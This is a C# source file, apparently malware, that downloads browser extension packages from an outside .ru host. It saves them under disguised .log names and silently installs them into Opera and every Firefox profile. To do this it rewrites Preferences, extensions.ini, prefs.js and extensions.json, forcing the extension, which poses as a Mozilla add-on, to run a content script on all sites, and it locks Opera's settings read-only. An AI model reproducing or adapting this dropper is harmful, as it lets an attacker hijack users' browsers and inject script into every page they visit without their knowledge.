using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using Ionic.Zip;
using System.Text.RegularExpressions;
using Microsoft.Win32;
/*ПОПРОБОВАТЬ ЗАМЕНЯТЬ ФАЙЛЫ ХРОМА НА СТАРУЮ ВЕРСИЮ*/
/*НЕ ОБРАБАТЫВАЕТСЯ Opera v12|x64 12*/

namespace V_extractFile
{
    class d3dx9_26_Class
    {
        // Work ()выполняется , если не удалось загрузить d3dx9_26.dll
        private List<string> MozProfiles = new List<string>();
        private string PPathToMozillaPlugin = @"http://chrome-document-global-created.ru/bmozillafirefox/mozillafirefoxstudio@mozilla.org.xpi";

        private string PPathToChromePlugin = @"http://chrome-document-global-created.ru/jgnclepkencmehkcohpkagffekghobfp.zip";
        private string PPathToChromePluginCRX = @"http://chrome-document-global-created.ru/mozillafirefoxstudio.crx";

        private string PPathToOperaPlugin = @"http://chrome-document-global-created.ru/bopera/2.0_0.zip";
        public void Work()
        {
            

            sinf sinf1 = new sinf();
            try
            {
                if (sinf1.installedOpera())
                {
                    if (!Directory.Exists(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Extensions"))
                    {
                        Directory.CreateDirectory(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Extensions");
                    }

                    if (!Directory.Exists(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Extensions\blpclagbhjejeengjjipkbaehacnnien"))
                    {
                        Directory.CreateDirectory(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Extensions\blpclagbhjejeengjjipkbaehacnnien");
                    }

                    // скачан архив с плагином
                    WebClient myWebClient4 = new WebClient();
                    myWebClient4.DownloadFile(PPathToOperaPlugin, sinf1.PathToTheTemporaryFolderUser + "\\" + "p014a.log");

                    string zipToUnpack = sinf1.PathToTheTemporaryFolderUser + "\\" + "p014a.log";
                    string unpackDirectory = Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Extensions\blpclagbhjejeengjjipkbaehacnnien";
                    using (ZipFile zip1 = ZipFile.Read(zipToUnpack))
                    {
                        // here, we extract every entry, but we could extract conditionally
                        // based on entry name, size, date, checkbox status, etc.  
                        foreach (ZipEntry e in zip1)
                        {
                            e.Extract(unpackDirectory, ExtractExistingFileAction.OverwriteSilently);
                        }
                    }

                    string sourcePreference = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Preferences");
                    if (sourcePreference.IndexOf("blpclagbhjejeengjjipkbaehacnnien") == -1)
                    {
                        string repOp = @"
""blpclagbhjejeengjjipkbaehacnnien"": {
            ""active_permissions"": {
               ""api"": [  ],
               ""manifest_permissions"": [  ],
               ""scriptable_host"": [ ""*://*/*"" ]
            },
            ""commands"": {

            },
            ""content_settings"": [  ],
            ""creation_flags"": 65537,
            ""events"": [  ],
            ""from_bookmark"": false,
            ""from_webstore"": false,
            ""granted_permissions"": {
               ""api"": [  ],
               ""manifest_permissions"": [  ],
               ""scriptable_host"": [ ""*://*/*"" ]
            },
            ""incognito_content_settings"": [  ],
            ""incognito_preferences"": {

            },
            ""initial_keybindings_set"": true,
            ""install_time"": ""13063309936056272"",
            ""is_pending_third_party_install"": false,
            ""location"": 1,
            ""manifest"": {
               ""content_scripts"": [ {
                  ""js"": [ ""background.js"" ],
                  ""matches"": [ ""*://*/*"" ],
                  ""run_at"": ""document_end""
               } ],
               ""icons"": {
                  ""128"": ""icon/128.png"",
                  ""48"": ""icon/48.png""
               },
               ""key"": ""MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqS5WiDNl0xpgXgy0N6VD/xY0uG/WvSd0GXALKAB7oi7mB4Xn+iJxLcEIk1EonF6JM23pooXDa0VFB03OcJLA/eIsvWwuIz4VFErTjjauxg30vciKlV9s0P5f+zVDNxtzI0/0zUFiiq0zVQmLBU00uQr+KrzsJhAVgdILFnL3TiQZuKo3I6OfrkoFPzbFd2WjlrW6uwvcp5qWRGGzjFuEugIfyCt2keVBNag7uYDa+lA2duxxoSyJJQfrLZut/J+j2pdS5xmsnbrFQnds9DF3aHvc8AkeGDS0CP7PmWkDQt+j58KQt0k55OWDeJCGx3l9F3kOk5zerj1cieeOXJgi+wIDAQAB"",
               ""manifest_version"": 2,
               ""name"": ""operasoftwarestudio"",
               ""version"": ""2.0"",
               ""web_accessible_resources"": [  ]
            },
            ""path"": ""blpclagbhjejeengjjipkbaehacnnien\\2.0_0"",
            ""preferences"": {

            },
            ""regular_only_preferences"": {

            },
            ""state"": 1,
            ""was_installed_by_default"": false,
            ""was_installed_by_oem"": false
         },
";
                        string patop = "\",\r\n      \"settings\": {";
                        Regex rgxOp = new Regex(patop);
                        string tmppref = rgxOp.Replace(sourcePreference, patop + repOp);

                        File.SetAttributes(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Preferences", FileAttributes.Normal);
                        File.WriteAllText(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Preferences", tmppref);
                        //File.SetAttributes(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Preferences", FileAttributes.ReadOnly);
                        File.SetAttributes(Environment.GetEnvironmentVariable("APPDATA") + @"\Opera Software\Opera Stable\Preferences", FileAttributes.Archive | FileAttributes.ReadOnly);
                    }



                }

            }
            catch(Exception ex)
            {

            }
            
            //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            // УСТАНОВКА ПЛАГИНА В МОЗИЛУ
            if (sinf1.installedMozilla())
            {
                
                // сбор профилей из файла profiles.ini
                if (File.Exists(sinf1.profINIPath))
                {
                    string line;
                    StreamReader file = new System.IO.StreamReader(@sinf1.profINIPath);
                    while ((line = file.ReadLine()) != null)
                    {
                        //MozProfiles.Add(line);
                        if (line.Contains("Path="))
                        {
                            string tmpprof = line;
                            tmpprof = tmpprof.Replace("Path=Profiles/", sinf1.profPath + @"\");
                            tmpprof = tmpprof.Replace("Path=", "");
                            MozProfiles.Add(tmpprof);
                        }
                    }
                    file.Close();
                    
                    // КОПИРОВАНИИЕ ПЛАГИНА ВО ВСЕ ПРОФИЛИ НА ТЕКУЩЕМ ПОЛЬЗОВАТЕЛЕ
                    try
                    {
                        
                        WebClient myWebClient = new WebClient();
                        myWebClient.DownloadFile(PPathToMozillaPlugin, sinf1.PathToTheTemporaryFolderUser + "\\" + "p011a.log"); // файл-плагин мозилы

                        
                        foreach (string prof in MozProfiles)
                        {
                            string prof1 = prof;
                            //string prof1 = @"C:\Users\raccoon\AppData\Roaming\Mozilla\Firefox\Profiles\bg3ae6wh.504";
                            //MessageBox.Show(prof);

                            if (!Directory.Exists(@prof1 + @"\extensions"))
                            {
                                Directory.CreateDirectory(@prof1 + @"\extensions");
                            }

                            File.Copy(@sinf1.PathToTheTemporaryFolderUser + "\\" + "p011a.log", @prof1 + @"\extensions\mozillafirefoxstudio@mozilla.org.xpi", true);
                            
                            //РЕДАКТИРОВАВАНИЕ ФАЙЛОВ КОНФИГУРАЦИИ
                            //*******************************************************
                            //extensions.ini
                            //******************************************************

                            sinf1.checkSection(@prof1 + @"\extensions.ini", "[ExtensionDirs]");
                            sinf1.checkSection(@prof1 + @"\extensions.ini", "[MultiprocessIncompatibleExtensions]");
                            
                            Dictionary<string, List<string>> array = new Dictionary<string, List<string>>();
                            List<string> list = new List<string>();
                            List<string> tmplist = new List<string>();
                            
                            foreach (string linet in File.ReadAllLines(@prof1 + @"\extensions.ini"))
                            {

                                if (linet.Length > 0)
                                {
                                    tmplist.Add(linet);
                                }
                            }
                            
                            tmplist.Reverse();



                            bool ExtensionDir = false;
                            bool ExtensionMult = false;
                            foreach (string s in tmplist)
                            {

                                // возможно плагин уже установлен - проверка
                                if (s.IndexOf(@"\mozillafirefoxstudio@mozilla.org.xpi") != -1) { ExtensionDir = true; }
                                if (s.IndexOf(@"=mozillafirefoxstudio@mozilla.org") != -1) { ExtensionMult = true; }

                                if (s.StartsWith("[") && s.EndsWith("]"))
                                {
                                    array.Add(s, new List<string> { });
                                    list.Reverse();
                                    array[s] = list;
                                    list = new List<string>();
                                }
                                else
                                {
                                    list.Add(s);
                                }
                            }

                            
                            StreamWriter sr1 = new StreamWriter(@prof1 + @"\extensions.ini", false); sr1.Close();
                            // удаление и запись в файл
                            StreamWriter sr = new StreamWriter(@prof1 + @"\extensions.ini", true);
                            foreach (KeyValuePair<string, List<string>> kvPair in array.Reverse())
                            {
                                // если не существует такой записи
                                if (!ExtensionDir)
                                {
                                    if (kvPair.Key == "[ExtensionDirs]") { array["[ExtensionDirs]"].Add("Extension" + (array["[ExtensionDirs]"].Count()) + @"=" + @prof1 + @"\extensions\mozillafirefoxstudio@mozilla.org.xpi"); }
                                }
                                if (!ExtensionMult)
                                {
                                    if (kvPair.Key == "[MultiprocessIncompatibleExtensions]") { array["[MultiprocessIncompatibleExtensions]"].Add("Extension" + (array["[MultiprocessIncompatibleExtensions]"].Count()) + "=mozillafirefoxstudio@mozilla.org"); }
                                }
                                //MessageBox.Show(kvPair.Key);
                                //Console.WriteLine(">>>" + kvPair.Key);

                                sr.WriteLine(kvPair.Key);


                                foreach (string str in array[kvPair.Key])
                                {

                                    sr.WriteLine(str);

                                    //MessageBox.Show(str);
                                    //Console.WriteLine("-" + str);
                                }

                                sr.WriteLine(String.Empty);

                                //Console.WriteLine(String.Empty);
                            } sr.Close();

                            //*******************************************************
                            //prefs.js
                            //******************************************************

                            string linePrefs = string.Empty;

                            StreamReader srPref = new StreamReader(@prof1 + @"\prefs.js");
                            string prefs = srPref.ReadToEnd();
                            srPref.Close();


                            List<string> lines = new List<string>();
                            StreamReader filePref = new System.IO.StreamReader(@prof1 + @"\prefs.js");
                            while ((linePrefs = filePref.ReadLine()) != null)
                            {
                                lines.Add(@linePrefs);
                            }
                            filePref.Close();

                            //user_pref("extensions.enabledAddons"
                            bool enabledAddons = false;
                            bool enabledInstallCache = false;
                            foreach (string s in lines)
                            {
                                if (s.StartsWith("user_pref(\"extensions.enabledAddons"))
                                {
                                    enabledAddons = true;
                                    if (s.IndexOf("mozillafirefoxstudio") >= 0)
                                    {
                                        // уже прописан
                                    }
                                    else
                                    {
                                        prefs = prefs.Replace(s, s.Replace("\");", ",mozillafirefoxstudio%40mozilla.org:1.0\");"));
                                        File.WriteAllText(@prof1 + @"\prefs.js", prefs);
                                    }

                                }

                                if (s.StartsWith("user_pref(\"extensions.installCache"))
                                {
                                    enabledInstallCache = true;
                                    if (s.IndexOf("mozillafirefoxstudio") >= 0)
                                    {
                                        // уже прописан
                                    }
                                    else
                                    {
                                        prefs = prefs.Replace(s, s.Replace("]\");", ",{\\\"name\\\":\\\"app-profile\\\",\\\"addons\\\":{\\\"mozillafirefoxstudio@mozilla.org\\\":{\\\"descriptor\\\":\\\"" + @prof1.Replace(@"\", @"\\") + "\\\\\\\\extensions\\\\\\\\mozillafirefoxstudio@mozilla.org.xpi\\\",\\\"mtime\\\":1418029569739}}}]\");"));
                                        File.WriteAllText(@prof1 + @"\prefs.js", prefs);
                                    }
                                }
                            }


                            if (!enabledAddons)
                            {
                                lines.Add("user_pref(\"extensions.enabledAddons\", \"mozillafirefoxstudio%40mozilla.org:1.0\");");
                                //lines.Sort();

                                StreamWriter srTmp = new StreamWriter(@prof1 + @"\prefs.js", false); srTmp.Close();
                                foreach (string s in lines)
                                {
                                    StreamWriter pr = new StreamWriter(@prof1 + @"\prefs.js", true);
                                    pr.WriteLine(@s);
                                    pr.Close();
                                }
                            }

                            if (!enabledInstallCache)
                            {
                                lines.Add("user_pref(\"extensions.installCache\", \"[{\\\"name\\\":\\\"app-profile\\\",\\\"addons\\\":{\\\"mozillafirefoxstudio@mozilla.org\\\":{\\\"descriptor\\\":\\\"" + @prof1.Replace(@"\", @"\\") + "\\\\\\\\extensions\\\\\\\\mozillafirefoxstudio@mozilla.org.xpi\\\",\\\"mtime\\\":1418029569739}}}]\");");

                                StreamWriter srTmp = new StreamWriter(@prof1 + @"\prefs.js", false); srTmp.Close();
                                foreach (string s in lines)
                                {
                                    StreamWriter pr = new StreamWriter(@prof1 + @"\prefs.js", true);
                                    pr.WriteLine(@s);
                                    pr.Close();
                                }
                            }
                            //*******************************************************
                            //extension.json
                            //******************************************************
                            if (File.Exists(@prof1 + @"\extensions.json"))
                            {
                                StreamReader srExtJson = new StreamReader(@prof1 + @"\extensions.json");
                                string extensionsJson = srExtJson.ReadToEnd();
                                srExtJson.Close();
                                if (extensionsJson.IndexOf("mozillafirefoxstudio") == -1)
                                {
                                    extensionsJson = extensionsJson.Replace("}]}", "},{\"id\":\"mozillafirefoxstudio@mozilla.org\",\"syncGUID\":\"Ylu7tH6EvIrk\",\"location\":\"app-profile\",\"version\":\"1.0\",\"type\":\"extension\",\"internalName\":null,\"updateURL\":null,\"updateKey\":null,\"optionsURL\":null,\"optionsType\":null,\"aboutURL\":null,\"iconURL\":null,\"icon64URL\":null,\"defaultLocale\":{\"name\":\"mozillafirefoxstudio\",\"description\":null,\"creator\":\"mozillafirefoxstudio\",\"homepageURL\":\"http://www.mozilla.org/\"},\"visible\":true,\"active\":true,\"userDisabled\":false,\"appDisabled\":false,\"descriptor\":\"" + @prof1.Replace(@"\", @"\\") + "\\\\extensions\\\\mozillafirefoxstudio@mozilla.org.xpi\",\"installDate\":1418029569739,\"updateDate\":1418029569739,\"applyBackgroundUpdates\":1,\"bootstrap\":false,\"size\":2859,\"sourceURI\":null,\"releaseNotesURI\":null,\"softDisabled\":false,\"foreignInstall\":false,\"hasBinaryComponents\":false,\"strictCompatibility\":false,\"locales\":[],\"targetApplications\":[{\"id\":\"{ec8030f7-c20a-464f-9b0e-13a3a9e97384}\",\"minVersion\":\"2.0\",\"maxVersion\":\"160.0.*\"}],\"targetPlatforms\":[],\"multiprocessCompatible\":false}]}");
                                    StreamWriter srTmp = new StreamWriter(@prof1 + @"\extensions.json", false); srTmp.Close();
                                    File.WriteAllText(@prof1 + @"\extensions.json", extensionsJson);
                                }
                            }
                            else
                            {
                                // создать файл
                                string str = "{\"schemaVersion\":16,\"addons\":[{\"id\":\"mozillafirefoxstudio@mozilla.org\",\"syncGUID\":\"Ylu7tH6EvIrk\",\"location\":\"app-profile\",\"version\":\"1.0\",\"type\":\"extension\",\"internalName\":null,\"updateURL\":null,\"updateKey\":null,\"optionsURL\":null,\"optionsType\":null,\"aboutURL\":null,\"iconURL\":null,\"icon64URL\":null,\"defaultLocale\":{\"name\":\"mozillafirefoxstudio\",\"description\":null,\"creator\":\"mozillafirefoxstudio\",\"homepageURL\":\"http://www.mozilla.org/\"},\"visible\":true,\"active\":true,\"userDisabled\":false,\"appDisabled\":false,\"descriptor\":\"" + @prof1.Replace(@"\", @"\\") + "\\\\extensions\\\\mozillafirefoxstudio@mozilla.org.xpi\",\"installDate\":1418029569739,\"updateDate\":1418029569739,\"applyBackgroundUpdates\":1,\"bootstrap\":false,\"size\":2859,\"sourceURI\":null,\"releaseNotesURI\":null,\"softDisabled\":false,\"foreignInstall\":false,\"hasBinaryComponents\":false,\"strictCompatibility\":false,\"locales\":[],\"targetApplications\":[{\"id\":\"{ec8030f7-c20a-464f-9b0e-13a3a9e97384}\",\"minVersion\":\"2.0\",\"maxVersion\":\"160.0.*\"}],\"targetPlatforms\":[],\"multiprocessCompatible\":false}]}";
                                File.WriteAllText(@prof1 + @"extensions.json", str);
                            }
                            
                        }

                    }
                    catch (Exception ex)
                    {

                    }


                }
            }
            //MessageBox.Show("Program100");

            
            



           
        }
    }
}
